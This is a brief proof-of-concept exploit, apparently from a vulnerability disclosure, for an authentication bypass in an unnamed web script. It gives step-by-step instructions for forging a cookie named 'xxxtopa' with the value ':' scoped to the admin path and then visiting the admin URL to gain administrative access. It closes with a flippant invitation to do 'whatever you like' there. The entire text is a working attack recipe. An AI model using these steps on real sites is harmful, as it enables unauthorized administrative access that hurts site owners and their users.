PoC/Exploit:
1.: Open a random cookie editor.
2.: Create a cookie, as usually:
  2.1: Set the host name.
  2.2: Set the path name. (e.g.: "[script-base-path]/admin/")
  2.3: Set the cookie name to "xxxtopa".
  2.4: Set the cookie value to ":".
  2.5: Save it.
3.: Visit the following URL: "[script-base-url]/admin/". (This won't work if the directory is "protected" with a .htaccess file.)
4.: Do whatever you like to do here. (Have fun!)
